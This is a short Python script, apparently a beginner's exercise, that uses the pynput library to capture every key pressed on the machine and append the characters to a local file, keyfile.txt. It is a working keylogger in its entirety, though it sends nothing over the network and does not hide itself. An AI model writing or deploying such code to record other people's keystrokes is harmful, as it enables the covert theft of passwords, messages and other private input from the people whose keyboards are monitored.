from pynput import keyboard

def keyPressed(key): #on_press automatically passes key, do not need to define it
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed) #on_press sends the events taken from the keyboard
    listener.start()
    input() #will ask for strings as inputs